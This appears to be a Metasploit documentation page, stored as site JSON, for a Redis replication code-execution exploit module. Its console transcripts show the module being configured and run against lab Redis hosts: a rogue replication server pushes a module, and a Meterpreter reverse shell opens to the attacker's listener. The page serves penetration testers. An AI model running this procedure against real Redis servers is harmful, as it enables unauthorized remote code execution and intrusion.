{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/linux/redis/redis_replication_cmd_exec","result":{"data":{"moduleMetadataJson":{"id":"2bcf7d28-f4fa-55c3-9a36-09d5059a6bf0","name":"Redis Replication Code Execution","fullname":"exploit/linux/redis/redis_replication_cmd_exec","description":"This module can be used to leverage the extension functionality added since Redis 4.0.0\n        to execute arbitrary code. To transmit the given extension it makes use of the feature of Redis\n        which called replication between master and slave.","rank":400,"fields":{"detailsSlug":"/modules/details/exploit/linux/redis/redis_replication_cmd_exec","documentationSlug":"/modules/documentation/exploit/linux/redis/redis_replication_cmd_exec"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<h3 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h3>\n<p>This module exploits a replication code execution vulnerability in Redis 4.x and later.</p>\n<h3 id=\"installation-setup\" style=\"position:relative;\"><a href=\"#installation-setup\" aria-label=\"installation setup permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Installation Setup.</h3>\n<p><strong>Vulnerable Application Link</strong></p>\n<ul>\n<li>Official Docker Images</li>\n</ul>\n<p><a href=\"https://hub.docker.com/_/redis/\">https://hub.docker.com/_/redis/</a></p>\n<h3 id=\"installation-setup-1\" style=\"position:relative;\"><a href=\"#installation-setup-1\" aria-label=\"installation setup 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Installation Setup.</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">docker pull redis\ndocker run -p 6379:6379 -d --name redis_slave redis</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<h3 id=\"custom\" style=\"position:relative;\"><a href=\"#custom\" aria-label=\"custom permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>CUSTOM</h3>\n<p>IF <code class=\"language-text\">CUSTOM</code> set to true, this exploit would generate a source code file, and\ncompile it to a redis module file during running, which is more undetectable.\nIt's only worked on linux system.</p>\n<p>For other scenarios, such as lack of gcc, or others opreate systems, framework\ncould not compile the source for sucessful exploit, it uses the\npre-compiled redis module to accomplish this exploit.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"set-custom-true-available-only-on-linux\" style=\"position:relative;\"><a href=\"#set-custom-true-available-only-on-linux\" aria-label=\"set custom true available only on linux permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>set CUSTOM true (available only on linux)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(multi/redis/redis_replication_cmd_exec) &gt; options\n\nModule options (exploit/linux/redis/redis_replication_cmd_exec):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   CUSTOM    true             yes       Whether compile payload file during exploiting\n   PASSWORD  foobared         no        Redis password for authentication test\n   RHOSTS    127.0.0.1        yes       The target address range or CIDR identifier\n   RPORT     6379             yes       The target port (TCP)\n   SRVHOST   172.17.0.1       yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT   6666             yes       The local port to listen on.\n\n\nPayload options (linux/x64/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  172.17.0.1       yes       The listen address (an interface may be specified)\n   LPORT  8080             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\nmsf5 exploit(multi/redis/redis_replication_cmd_exec) &gt; set verbose false\nverbose =&gt; false\nmsf5 exploit(multi/redis/redis_replication_cmd_exec) &gt; exploit\n\n[*] Started reverse TCP handler on 172.17.0.1:8080 \n[*] 127.0.0.1:6379        - Compile redis module extension file\n[+] 127.0.0.1:6379        - Payload  generate successful! \n[*] 127.0.0.1:6379        - Listening on 172.17.0.1:6666\n[*] 127.0.0.1:6379        - Rogue server close...\n[*] 127.0.0.1:6379        - Sending command to trigger payload.\n[*] Sending stage (3021284 bytes) to 172.17.0.2\n[*] Meterpreter session 4 opened (172.17.0.1:8080 -&gt; 172.17.0.2:49556) at 2019-07-19 11:58:52 -0400\n[!] 127.0.0.1:6379        - This exploit may require manual cleanup of &#39;./vxwqrg.so&#39; on the target\n\nmeterpreter &gt; getuid\nServer username: uid=999, gid=999, euid=999, egid=999\nmeterpreter &gt; </code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"set-custom-false-available-on-all-system\" style=\"position:relative;\"><a href=\"#set-custom-false-available-on-all-system\" aria-label=\"set custom false available on all system permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Set CUSTOM false (available on all system)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/linux/redis/redis_replication_cmd_exec\nmsf5 exploit(linux/redis/redis_replication_cmd_exec) &gt; options\n\nModule options (exploit/linux/redis/redis_replication_cmd_exec):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   CUSTOM    false            yes       Whether compile payload file during exploiting\n   PASSWORD  foobared         no        Redis password for authentication test\n   RHOSTS                     yes       The target address range or CIDR identifier\n   RPORT     6379             yes       The target port (TCP)\n   SRVHOST   0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT   6379             yes       The local port to listen on.\n\n\nPayload options (linux/x64/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST                   yes       The listen address (an interface may be specified)\n   LPORT  4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\nmsf5 exploit(linux/redis/redis_replication_cmd_exec) &gt; set rhosts 172.16.6.226\nrhosts =&gt; 172.16.6.226\nmsf5 exploit(linux/redis/redis_replication_cmd_exec) &gt; set srvhost 172.16.6.1\nsrvhost =&gt; 172.16.6.1\nmsf5 exploit(linux/redis/redis_replication_cmd_exec) &gt; set srvport 6666\nsrvport =&gt; 6666\nmsf5 exploit(linux/redis/redis_replication_cmd_exec) &gt; set lhost 172.16.6.1\nlhost =&gt; 172.16.6.1\nmsf5 exploit(linux/redis/redis_replication_cmd_exec) &gt; set lport 9999\nlport =&gt; 9999\nmsf5 exploit(linux/redis/redis_replication_cmd_exec) &gt; options\n\nModule options (exploit/linux/redis/redis_replication_cmd_exec):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   CUSTOM    true             yes       Whether compile payload file during exploiting\n   PASSWORD  foobared         no        Redis password for authentication test\n   RHOSTS    172.16.6.226     yes       The target address range or CIDR identifier\n   RPORT     6379             yes       The target port (TCP)\n   SRVHOST   172.16.6.1       yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT   6666             yes       The local port to listen on.\n\n\nPayload options (linux/x64/meterpreter/reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  172.16.6.1       yes       The listen address (an interface may be specified)\n   LPORT  9999             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\nmsf5 exploit(linux/redis/redis_replication_cmd_exec) &gt; exploit\n\n[*] Started reverse TCP handler on 172.16.6.1:9999\n[*] 172.16.6.226:6379     - Listening on 172.16.6.1:6666\n[*] 172.16.6.226:6379     - Rogue server close...\n[*] 172.16.6.226:6379     - Sending command to trigger payload.\n[*] Sending stage (3021284 bytes) to 172.16.6.226\n[*] Meterpreter session 3 opened (172.16.6.1:9999 -&gt; 172.16.6.226:50362) at 2019-07-19 23:53:13 +0800\n[*] 172.16.6.226:6379     - Command Stager progress - 100.00% done (819/819 bytes)\n[!] 172.16.6.226:6379     - This exploit may require manual cleanup of &#39;./wfuujx.so&#39; on the target\n\nmeterpreter &gt; getuid\nServer username: uid=999, gid=999, euid=999, egid=999\nmeterpreter &gt; getpid\nCurrent pid: 173</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"2bcf7d28-f4fa-55c3-9a36-09d5059a6bf0"}}}